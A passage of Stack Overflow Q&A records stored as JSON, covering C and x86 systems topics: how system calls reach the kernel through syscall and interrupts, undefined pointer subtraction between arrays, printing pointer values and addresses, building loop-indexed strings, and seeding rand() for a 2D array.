<code>syscall</code>.</p>\n<p>To recap, control can be given to the kernel through three mechanism:</p>\n<ul>\n<li>Software interrupts.<br />\nThis was <code>int 80h</code> for 32-bit Linux (pre 2.5) and <code>int 2eh</code> for 32-bit Windows.</li>\n<li>Via <code>sysenter</code>.<br />\nUsed by 32-bit versions of Linux since 2.5.</li>\n<li>Via <code>syscall</code>.<br />\nUsed by 64-bit versions of Linux and Windows.</li>\n</ul>\n<p><a href=\"https://lwn.net/Articles/604515/\" rel=\"noreferrer\">Here is a nice page to put it in a better shape</a>.</p>\n<p>The C runtime is usually a static library, thus pre-compiled, that uses one of the three methods above.</p>\n<p>The <a href=\"https://www.felixcloutier.com/x86/SYSCALL.html\" rel=\"noreferrer\"><code>syscall</code> instruction</a> transfers control to a kernel entry-point (see <a href=\"https://elixir.bootlin.com/linux/v4.13.8/source/arch/x86/entry/entry_64.S\" rel=\"noreferrer\">entry_64.s</a>) directly.<br />\nIt is an instruction that just does so, it is not implemented by the OS, it is <em>used</em> by the OS.</p>\n<p>The term <em>exception</em> is overloaded in CS, C++ has exceptions, so do Java and C#.<br />\nThe OS can have a language agnostic exception trapping mechanism (under windows it was once called <em>SEH</em>, now has been rewritten).<br />\nThe CPU also has exceptions.<br />\nI believe we are talking about the last meaning.</p>\n<p>Exceptions are dispatched through interrupts, they are a kind of interrupt.<br />\nIt goes unsaid that while exceptions are synchronous (they happen at specific, replayable points) they are &quot;unwanted&quot;, they are exceptional, in the sense that programmers tend to avoid them and when they happen is due to either a bug, an unhandled corner case or a bad situation.<br />\nThey, thus, are not used to transfer control to the kernel (they could).</p>\n<p>Software interrupts (that are synchronous too) were used instead; the mechanism is almost exactly the same (exceptions can have a status code pushed on the kernel stack) but the semantic is different.<br />\nWe never deferenced a null-pointer, accessed an unmapped page or similar to invoke a system call, we used the <code>int</code> instruction instead.</p>\n"}, {"comments": [{"owner": {"reputation": 84872, "user_id": 2545680, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/DCo33.jpg?s=128&g=1", "display_name": "Max Koretskyi", "link": "https://stackoverflow.com/users/2545680/max-koretskyi"}, "edited": false, "score": 0, "creation_date": 1524719408, "post_id": 50035040, "comment_id": 87086456, "body": "Thanks for your input! Upvoted. It was a bad word choice on my part. I meant the <code>write</code> function itself is implemented as <code>syscall</code>. But, anyways, you confirmed my expectations"}], "tags": [], "owner": {"reputation": 170455, "user_id": 149341, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/omfTQ.png?s=128&g=1", "display_name": "duskwuff -inactive-", "link": "https://stackoverflow.com/users/149341/duskwuff-inactive"}, "is_accepted": false, "score": 3, "last_activity_date": 1524718229, "creation_date": 1524718229, "answer_id": 50035040, "question_id": 50025864, "link": "https://stackoverflow.com/questions/50025864/relationship-between-system-calls-api-syscall-instruction-and-exception-mechani/50035040#50035040", "title": "Relationship between system calls API, syscall instruction and exception mechanism (interrupts)", "body": "<blockquote>\n  <p>Is my understanding correct that C language system calls are implemented by compiler as syscall's with respective code in assembly [\u2026]?</p>\n</blockquote>\n\n<p><strong>No.</strong></p>\n\n<p>The C compiler handles system calls the same way that it handles calls to any other function:</p>\n\n<pre><code>; write(2, \"There was an error writing to standard out\\n\", 44);\nmov    $44, %edx\nlea    .LC0(%rip), %rsi  ; address of the string\nmov    $2, %edi\ncall   write\n</code></pre>\n\n<p>The implementation of these functions in libc (your system's C library) will probably contain a <code>syscall</code> instruction, or whatever the equivalent is on your system's architecture.</p>\n"}], "owner": {"reputation": 84872, "user_id": 2545680, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/DCo33.jpg?s=128&g=1", "display_name": "Max Koretskyi", "link": "https://stackoverflow.com/users/2545680/max-koretskyi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 961, "favorite_count": 2, "accepted_answer_id": 50030393, "answer_count": 4, "score": 4, "last_activity_date": 1524744194, "creation_date": 1524669411, "last_edit_date": 1524670339, "question_id": 50025864, "link": "https://stackoverflow.com/questions/50025864/relationship-between-system-calls-api-syscall-instruction-and-exception-mechani", "title": "Relationship between system calls API, syscall instruction and exception mechanism (interrupts)", "body": "<p>I'm trying to understand the relationship between <code>C</code> language system calls API, <code>syscall</code> assembler instruction and the exception mechanism (interrupts) used to switch contexts between processes. There's a lot to study out on my own, so please bear with me.</p>\n\n<p>Is my understanding correct that <code>C</code> language system calls are implemented by compiler as <code>syscall</code>'s with respective code in assembly, which in turn, are implemented by OS as exceptions mechanism (interrupts)? </p>\n\n<p>So the call to the <code>write</code> function in the following <code>C</code> code:</p>\n\n<pre><code>#include &lt;unistd.h&gt;\n\nint main(void)\n{\n    write(2, \"There was an error writing to standard out\\n\", 44);\n    return 0;\n}\n</code></pre>\n\n<p>Is compiled to assembly as a <code>syscall</code> instruction:</p>\n\n<pre><code>mov eax,4       ; system call number (sys_write)\nsyscall \n</code></pre>\n\n<p>And the instruction, in turn, is implemented by OS as exceptions mechanism (interrupt)?</p>\n"}, {"tags": ["c", "memory"], "answers": [{"tags": [], "owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "is_accepted": false, "score": 4, "last_activity_date": 1524669419, "creation_date": 1524669419, "answer_id": 50025870, "question_id": 50025839, "link": "https://stackoverflow.com/questions/50025839/why-the-output-of-this-c-code-is-like-this/50025870#50025870", "title": "Why the output of this &#39;C&#39; code is like this?", "body": "<p>The behaviour of the code is <em>undefined</em>.</p>\n\n<p>Pointer arithmetic, including the subtraction of two pointers, is <em>only</em> valid for pointers to elements within the same array. (For this purpose you can set a pointer to one past the end of an array, and an object counts as an array with one element.)</p>\n"}, {"comments": [{"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "reply_to_user": {"reputation": 15800, "user_id": 1274314, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/gSYsp.jpg?s=128&g=1", "display_name": "TypeIA", "link": "https://stackoverflow.com/users/1274314/typeia"}, "edited": false, "score": 0, "creation_date": 1524673212, "post_id": 50025951, "comment_id": 87070240, "body": "@TypeIA: Updated."}, {"owner": {"reputation": 8402, "user_id": 4664415, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Hsfxj.jpg?s=128&g=1", "display_name": "mevets", "link": "https://stackoverflow.com/users/4664415/mevets"}, "edited": false, "score": 0, "creation_date": 1526101109, "post_id": 50025951, "comment_id": 87622305, "body": "Apparently I passed a test by up-voting this, but in an effort to undo that goodness, you might want to back off a bit on the \u201cC Standard Idolatry\u201d.  The C Standard is inferior to  historical practice, and the psalms of  undefined behaviour  a thin rationale to cheat at benchmarks  Thank you clang.  C is primarily a systems language, and deals effectively with systems oriented constructs.  If you don\u2019t like systems languages, use C++, that is why it exists."}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "reply_to_user": {"reputation": 8402, "user_id": 4664415, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Hsfxj.jpg?s=128&g=1", "display_name": "mevets", "link": "https://stackoverflow.com/users/4664415/mevets"}, "edited": false, "score": 1, "creation_date": 1526124045, "post_id": 50025951, "comment_id": 87627439, "body": "@mevets: How many C compilers guarantee the layout of objects declared as <code>a</code> and <code>b</code> are declared in the question? Even if a compiler guarantees that pointer arithmetic works as addresses in a flat address space, compilers generally do not guarantee how objects are laid out on the stack. So one cannot rely on <code>&amp;b[3] - &amp;a[2]</code> being \u22123, and this needs to be stated in the answer. Additionally, optimization is becoming increasingly aggressive in compilers, so a compiler that did support general address arithmetic might still recognize that <code>&amp;b[3] - &amp;a[2]</code> is undefined and subject to optimization."}], "tags": [], "owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "is_accepted": true, "score": 14, "last_activity_date": 1524673137, "last_edit_date": 1524673137, "creation_date": 1524669679, "answer_id": 50025951, "question_id": 50025839, "link": "https://stackoverflow.com/questions/50025839/why-the-output-of-this-c-code-is-like-this/50025951#50025951", "title": "Why the output of this &#39;C&#39; code is like this?", "body": "<p>While the C standard does not define the behavior when you subtract pointers to elements in different arrays, what seems to have happened is that your compiler put <code>b</code> in memory just before (at a lower address than) <code>a</code>. Thus, the memory layout looked like:</p>\n\n<pre><code>+------+------+------+------+------+------+------+------+\n| b[0] | b[1] | b[2] | b[3] | a[0] | a[1] | a[2] | a[3] |\n+------+------+------+------+------+------+------+------+\n</code></pre>\n\n<p>Given this memory layout, <code>&amp;a[2] - &amp;b[3]</code> is +3 because <code>a[2]</code> is three elements later in memory than <code>b[3]</code>. Then <code>&amp;b[3] - &amp;a[2]</code> is -3 because <code>b[3]</code> is three elements earlier in memory than <code>a[2]</code>. (Note that simple pointer arithmetic like this that does not conform to the C standard can break because the compiler may perform various optimizations or because address arithmetic is complicated on some architectures. The C standard does not just not define the result of the subtraction; it does not define the behavior of the program at all once an undefined subtraction is performed.)</p>\n\n<p>Many C implementations put objects on a stack (if they have automatic storage duration, rather than static, allocated, or thread), and it is common for the stack to start at a high memory address and grow toward lower addresses. So, if the compiler is simply allocating space for objects in the order you declare them (this is not to be expected generally; there are a number of reasons to do fancier things), then it effectively would put <code>a</code> on the stack first, then decrease the stack pointer, and then put <code>b</code> on the stack, so <code>b</code> ends up at a lower address than <code>a</code>.</p>\n\n<p>Incidentally, the result of subtracting two pointers has size <code>ptrdiff_t</code>, which is not necessarily <code>int</code>, so it ought to be printed with <code>printf(\"%td\\n\", n);</code> rather than <code>%d</code>, and <code>n</code> should be declared with <code>ptrdiff_t n;</code> rather than <code>int n;</code>. The <code>ptrdiff_t</code> type is defined in the <code>&lt;stddef.h&gt;</code> header.</p>\n"}, {"comments": [{"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 0, "creation_date": 1524670245, "post_id": 50026043, "comment_id": 87068432, "body": "Calling conventions specify what a program must put on the stack and in registers when calling a routine. They do not govern how a routine manages its own local objects. The result cannot be expected to be easily predictable, as a compiler might rearrange local objects to suit purposes of space efficiency, performance, or other reasons. Optimization might even eliminate the objects from memory entirely."}, {"owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "edited": false, "score": 0, "creation_date": 1524765723, "post_id": 50026043, "comment_id": 87114813, "body": "Sorry but you cannot say one is going to get a consistent/predictable value when the behaviour is unpredictable.  Case the compiler had arranged a different memory allocation or placed more data in between the two arrays, you&#39;d had gotten a different value.  Optimizing can make things even worse.  Cannot accept your answer as valid."}], "tags": [], "owner": {"reputation": 182, "user_id": 522489, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d4af8b90673b0ff67ecfc95219636234?s=128&d=identicon&r=PG", "display_name": "Foran", "link": "https://stackoverflow.com/users/522489/foran"}, "is_accepted": false, "score": -3, "last_activity_date": 1524669989, "creation_date": 1524669989, "answer_id": 50026043, "question_id": 50025839, "link": "https://stackoverflow.com/questions/50025839/why-the-output-of-this-c-code-is-like-this/50026043#50026043", "title": "Why the output of this &#39;C&#39; code is like this?", "body": "<p>With C calling convention (on x86) local variables are pushed onto the local stack and as a result are adjacent in memory.</p>\n\n<p>In this case the two arrays are relatively adjacent in memory. (The exact value can be effected by things like byte/word/qword alignment)</p>\n\n<p>The end result you'll get a consistent value, that can be predicable given your build environment/options.</p>\n"}], "owner": {"reputation": 899, "user_id": 6455473, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/12006a51d679d3110ad217e2ace11c5f?s=128&d=identicon&r=PG&f=1", "display_name": "neo", "link": "https://stackoverflow.com/users/6455473/neo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 174, "favorite_count": 0, "accepted_answer_id": 50025951, "answer_count": 3, "score": 1, "last_activity_date": 1524673137, "creation_date": 1524669350, "question_id": 50025839, "link": "https://stackoverflow.com/questions/50025839/why-the-output-of-this-c-code-is-like-this", "title": "Why the output of this &#39;C&#39; code is like this?", "body": "<p>I have following C code: </p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\nint main() {\n\nint a[4] = {1,2,3,4};\n\nint b[4] = {1,2,3,4};\n\nint n = &amp;b[3] - &amp;a[2];\n\nprintf(\"%d\\n\", n);\n\nreturn 0;\n}\n</code></pre>\n\n<p>Why the value of <code>n</code> is -3? I don't have a pure explanation for that. How can the difference between the addresses of the variables be a <code>-3</code>? And why it is exactly <code>-3</code>?</p>\n"}, {"tags": ["c", "struct"], "comments": [{"owner": {"reputation": 12461, "user_id": 266487, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/585595b6a24df9b742ebc186788e9a8e?s=128&d=identicon&r=PG", "display_name": "harper", "link": "https://stackoverflow.com/users/266487/harper"}, "edited": false, "score": 1, "creation_date": 1524668829, "post_id": 50025596, "comment_id": 87067393, "body": "<code>head</code> gives you the value of the un-initialized pointer, what is undefined behavior. <code>&amp;head</code> gives you the address of your variable <code>head</code>. Why should value and address be the same?"}, {"owner": {"reputation": 20558, "user_id": 2864275, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/p2xKk.png?s=128&g=1", "display_name": "I\u0142ya Bursov", "link": "https://stackoverflow.com/users/2864275/i%c5%82ya-bursov"}, "edited": false, "score": 1, "creation_date": 1524668886, "post_id": 50025596, "comment_id": 87067430, "body": "also, its better to use <code>%p</code> to print pointers, check <a href=\"https://stackoverflow.com/questions/9053658/correct-format-specifier-to-print-pointer-address\" title=\"correct format specifier to print pointer address\">stackoverflow.com/questions/9053658/&hellip;</a>"}, {"owner": {"reputation": 11619, "user_id": 5346306, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BsACH.jpg?s=128&g=1", "display_name": "Achal", "link": "https://stackoverflow.com/users/5346306/achal"}, "edited": false, "score": 1, "creation_date": 1524668902, "post_id": 50025596, "comment_id": 87067440, "body": "<i>Why is the printed value differ ?</i> because <code>head</code> and <code>&amp;head</code> are not same. when you print <code>head</code> it print what it contains which is <code>NULL</code> and when you print address of <code>head</code> it prints address ."}, {"owner": {"reputation": 27, "user_id": 9211524, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/2h5a8.jpg?s=128&g=1", "display_name": "Bernard Wijaya", "link": "https://stackoverflow.com/users/9211524/bernard-wijaya"}, "edited": false, "score": 0, "creation_date": 1524668944, "post_id": 50025596, "comment_id": 87067475, "body": "sorry I forgot to Initialized it as NULL"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1524670106, "post_id": 50025596, "comment_id": 87068324, "body": "<code>printf(&quot;%lld %lld&quot;, head, &amp;head);</code> is not a well defined way to print 2 pointers.  Suggest <code>printf(&quot;%p %p\\n&quot;, (void*) head, (void*) &amp;head);</code> instead and report you findings."}], "answers": [{"tags": [], "owner": {"reputation": 5314, "user_id": 5270581, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/leDO2.jpg?s=128&g=1", "display_name": "Laurent H.", "link": "https://stackoverflow.com/users/5270581/laurent-h"}, "is_accepted": false, "score": 1, "last_activity_date": 1524670522, "creation_date": 1524670522, "answer_id": 50026222, "question_id": 50025596, "link": "https://stackoverflow.com/questions/50025596/struct-pointer-and-memory-location/50026222#50026222", "title": "struct pointer and memory location", "body": "<p>Looking at your code, <code>head</code> is a variable. The fact that it is a pointer on <code>SData</code> structure is not useful to understand:  </p>\n\n<ul>\n<li><strong>head</strong> returns the value of the variable <code>head</code>, here it is NULL.</li>\n<li><strong>&amp;head</strong> returns the address of the variable <code>head</code>, here it depends on your compiler and linker configuration. As <code>head</code> is a local variable, it may be an address of a location in the stack.</li>\n</ul>\n"}, {"tags": [], "owner": {"reputation": 113, "user_id": 8267282, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9a843b009122c6c6005590080e6bcf4b?s=128&d=identicon&r=PG&f=1", "display_name": "Bruno", "link": "https://stackoverflow.com/users/8267282/bruno"}, "is_accepted": false, "score": 1, "last_activity_date": 1524676903, "creation_date": 1524676903, "answer_id": 50028040, "question_id": 50025596, "link": "https://stackoverflow.com/questions/50025596/struct-pointer-and-memory-location/50028040#50028040", "title": "struct pointer and memory location", "body": "<p>Printing \"head\" you can see the address of memory block where it's pointing (NULL), and printing \"&amp;head\" you see the adress of memory block where the \"head\" variable is stored.</p>\n"}], "owner": {"reputation": 27, "user_id": 9211524, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/2h5a8.jpg?s=128&g=1", "display_name": "Bernard Wijaya", "link": "https://stackoverflow.com/users/9211524/bernard-wijaya"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 236, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1524676903, "creation_date": 1524668660, "last_edit_date": 1524672046, "question_id": 50025596, "link": "https://stackoverflow.com/questions/50025596/struct-pointer-and-memory-location", "title": "struct pointer and memory location", "body": "<pre><code>struct Data\n{\n    int num;\n    struct *next, *prev;\n};\n\ntypedef struct Data sData;\n\nint main()\n{\n    sData *head;\n    head = NULL;\n    printf(\"%lld %lld\", head, &amp;head);\n    return 0;\n}\n</code></pre>\n\n<p>I am trying to understand deeper about struct pointers and their memory allocations. Why do the printed values differ?</p>\n"}, {"tags": ["c", "string"], "comments": [{"owner": {"reputation": 72748, "user_id": 3185459, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PBjxg.jpg?s=128&g=1", "display_name": "RomanPerekhrest", "link": "https://stackoverflow.com/users/3185459/romanperekhrest"}, "edited": false, "score": 0, "creation_date": 1524668784, "post_id": 50025562, "comment_id": 87067353, "body": "you have <code>str_3</code> but not <code>str_i</code>"}, {"owner": {"reputation": 367, "user_id": 9499466, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/18476ecb3774bfcda403a3c69cfc0e5c?s=128&d=identicon&r=PG&f=1", "display_name": "AskMath", "link": "https://stackoverflow.com/users/9499466/askmath"}, "reply_to_user": {"reputation": 72748, "user_id": 3185459, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PBjxg.jpg?s=128&g=1", "display_name": "RomanPerekhrest", "link": "https://stackoverflow.com/users/3185459/romanperekhrest"}, "edited": false, "score": 0, "creation_date": 1524668871, "post_id": 50025562, "comment_id": 87067420, "body": "@RomanPerekhrest I know, and I want that instead &quot;atom_i&quot; to get <code>atom_${i}</code> in according to the really value of <code>i</code> in any iteration.."}, {"owner": {"reputation": 2120, "user_id": 9167702, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7936df8ed092bb16463bde29df803d6e?s=128&d=identicon&r=PG&f=1", "display_name": "Tobi", "link": "https://stackoverflow.com/users/9167702/tobi"}, "edited": false, "score": 0, "creation_date": 1524669112, "post_id": 50025562, "comment_id": 87067599, "body": "I don&#39;t understand your question, what&#39;s the required output?"}, {"owner": {"reputation": 367, "user_id": 9499466, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/18476ecb3774bfcda403a3c69cfc0e5c?s=128&d=identicon&r=PG&f=1", "display_name": "AskMath", "link": "https://stackoverflow.com/users/9499466/askmath"}, "reply_to_user": {"reputation": 2120, "user_id": 9167702, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7936df8ed092bb16463bde29df803d6e?s=128&d=identicon&r=PG&f=1", "display_name": "Tobi", "link": "https://stackoverflow.com/users/9167702/tobi"}, "edited": false, "score": 0, "creation_date": 1524669262, "post_id": 50025562, "comment_id": 87067702, "body": "@Tobi What that required is: how to do the next comparisons in singele line: <code>strcmp(str_3,&quot;atom_0&quot;)</code> ,  <code>strcmp(str_3,&quot;atom_1&quot;)</code> ,  <code>strcmp(str_3,&quot;atom_2&quot;)</code>  ,  <code>strcmp(str_3,&quot;atom_3&quot;)</code>  , <code>strcmp(str_3,&quot;atom_4&quot;)</code>"}, {"owner": {"reputation": 742, "user_id": 3605642, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ceafb3476506141367f3cc6b033d7ad2?s=128&d=identicon&r=PG", "display_name": "Michal Lonski", "link": "https://stackoverflow.com/users/3605642/michal-lonski"}, "edited": false, "score": 0, "creation_date": 1524669510, "post_id": 50025562, "comment_id": 87067883, "body": "Are you asking how to convert the integer <code>i</code> to string and concatenate it with <code>atom_</code> ? Check this: <a href=\"https://stackoverflow.com/questions/8257714/how-to-convert-an-int-to-string-in-c\">How to convert an int to string in C</a>"}], "answers": [{"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 0, "last_activity_date": 1524669542, "creation_date": 1524669542, "answer_id": 50025914, "question_id": 50025562, "link": "https://stackoverflow.com/questions/50025562/how-can-i-write-a-string-that-changes-from-iteration-to-iteration/50025914#50025914", "title": "How can I write a string that changes from iteration to iteration?", "body": "<blockquote>\n  <p>How can I write a string that changes from iteration to iteration?<br>\n  ... to get effect so that <code>str_i</code> will be compared with \"atom_0\", \"atom_1\" , ... , \"atom_4\".</p>\n</blockquote>\n\n<p>Construct the compare string on each iteration. </p>\n\n<pre><code>// This is  not elegant, yet meets OP goals.\nfor(int i=0;i&lt;5;i++) {\n  char atom_i[30];\n  sprintf(atom_i, \"atom_%d\", i);\n  if(strcmp(str_i, atom_i)!=0){\n     printf(\"FALSE\");\n  }\n}\n</code></pre>\n\n<hr>\n\n<p>Yet a better approach would scan <code>str_i</code> and avoid iteration.</p>\n\n<pre><code>int d = 0;\nchar ch;  // Use to look for extra text\nif (sscanf(str_i, \"atom_%d%c\", &amp;d, &amp;ch) == 1) {\n  if (d &gt;= 0 &amp;&amp; d &lt; 5) {\n    ; // do something with str_i\n  }\n}\n</code></pre>\n"}], "owner": {"reputation": 367, "user_id": 9499466, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/18476ecb3774bfcda403a3c69cfc0e5c?s=128&d=identicon&r=PG&f=1", "display_name": "AskMath", "link": "https://stackoverflow.com/users/9499466/askmath"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 31, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1524728038, "creation_date": 1524668582, "last_edit_date": 1524728038, "question_id": 50025562, "link": "https://stackoverflow.com/questions/50025562/how-can-i-write-a-string-that-changes-from-iteration-to-iteration", "title": "How can I write a string that changes from iteration to iteration?", "body": "<p>If I want to write in <code>for</code> loop (for example) something with the next mention:  </p>\n\n<pre><code>for(int i=0;i&lt;5;i++) {\n  char* str_3=\"atom_3\";\n  if(strcmp(str_3,\"atom_i\")!=0){  // I know that it's not true to get it by \n                                  //this line.  \n     printf(\"FALSE\");\n  }\n}\n</code></pre>\n\n<p>I want to get effect so that <code>str_i</code> will be compared with <code>atom_0</code>, <code>atom_1</code> , ... , <code>atom_4</code>.<br>\nHow can I do it?</p>\n"}, {"tags": ["c", "arrays", "random", "time"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1524668559, "post_id": 50025517, "comment_id": 87067183, "body": "Take a look at <code>ar[NROW][NCOL]= (rand()%101);</code> again. Is that really correct? What element in <code>ar</code> are you assigning to?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1524668596, "post_id": 50025517, "comment_id": 87067203, "body": "Also, don&#39;t forget to <a href=\"http://en.cppreference.com/w/c/numeric/random/srand\" rel=\"nofollow noreferrer\">seed</a> the prng."}, {"owner": {"reputation": 25, "user_id": 5273734, "user_type": "registered", "profile_image": "https://graph.facebook.com/1065607453451776/picture?type=large", "display_name": "Muhammad Shaeel Abbas", "link": "https://stackoverflow.com/users/5273734/muhammad-shaeel-abbas"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1524668687, "post_id": 50025517, "comment_id": 87067274, "body": "I solved it, I&#39;m such an idiot."}, {"owner": {"reputation": 25, "user_id": 5273734, "user_type": "registered", "profile_image": "https://graph.facebook.com/1065607453451776/picture?type=large", "display_name": "Muhammad Shaeel Abbas", "link": "https://stackoverflow.com/users/5273734/muhammad-shaeel-abbas"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1524668706, "post_id": 50025517, "comment_id": 87067295, "body": "What do you mean seed the prng?"}, {"owner": {"reputation": 11619, "user_id": 5346306, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BsACH.jpg?s=128&g=1", "display_name": "Achal", "link": "https://stackoverflow.com/users/5346306/achal"}, "edited": false, "score": 0, "creation_date": 1524668719, "post_id": 50025517, "comment_id": 87067305, "body": "<code>ar[NROW][NCOL]= (rand()%101);</code> --&gt;   as  <code>ar[i][j]= (rand()%101);</code>"}, {"owner": {"reputation": 2461, "user_id": 2405914, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/VoFWS.jpg?s=128&g=1", "display_name": "Leonardo Alves Machado", "link": "https://stackoverflow.com/users/2405914/leonardo-alves-machado"}, "edited": false, "score": 0, "creation_date": 1524668770, "post_id": 50025517, "comment_id": 87067342, "body": "The seed explanation is on the link on his comment: <a href=\"http://en.cppreference.com/w/c/numeric/random/srand\" rel=\"nofollow noreferrer\">en.cppreference.com/w/c/numeric/random/srand</a>"}, {"owner": {"reputation": 42446, "user_id": 902497, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff13ece6277497484bfa2911c6183a30?s=128&d=identicon&r=PG", "display_name": "Raymond Chen", "link": "https://stackoverflow.com/users/902497/raymond-chen"}, "edited": false, "score": 0, "creation_date": 1524669041, "post_id": 50025517, "comment_id": 87067546, "body": "Please post an answer so that others can benefit from your work."}], "answers": [{"tags": [], "owner": {"reputation": 11619, "user_id": 5346306, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BsACH.jpg?s=128&g=1", "display_name": "Achal", "link": "https://stackoverflow.com/users/5346306/achal"}, "is_accepted": true, "score": 0, "last_activity_date": 1524669929, "creation_date": 1524669929, "answer_id": 50026030, "question_id": 50025517, "link": "https://stackoverflow.com/questions/50025517/array-not-being-randomized-as-it-should-and-values-coming-in-negative/50026030#50026030", "title": "Array not being randomized as it should and values coming in negative", "body": "<p>Firstly, the statement <code>ar[NROW][NCOL]= (rand()%101);</code> is not correct as  every time  you are assigning data into same <code>ar[NROW][NCOL]</code> and <code>NROW</code> &amp; <code>NCOL</code> is not varying.</p>\n\n<p>So Replace it like <code>ar[i][j]= (rand()%101);</code></p>\n\n<p>Secondly, to print array elements, print like this</p>\n\n<pre><code>for (i=0;i&lt;NROW;i++){  /* don't use &lt; 5 or &lt; 7 if you have NROW &amp; NCOL*/\n        for(j=0;j&lt;NCOL;j++){\n               ar[i][j]= (rand()%101);\n        }\n} \n</code></pre>\n\n<p>Finally, In statement <code>ar[i][j]= (rand()%101);</code> <code>rand()</code> generates same random number if you don't change the seed value. Read the manual page of <code>rand()</code> and <code>srand()</code>. for e.g use <code>srand(getpid())</code> before calling <code>rand()</code>.</p>\n\n<pre><code>srand(getpid());/*getpid() returns process id and \n              every time process manager generates different process id*/ \n</code></pre>\n\n<p>See this <a href=\"http://man7.org/linux/man-pages/man3/rand.3.html\" rel=\"nofollow noreferrer\">http://man7.org/linux/man-pages/man3/rand.3.html</a> and <a href=\"https://linux.die.net/man/3/srand\" 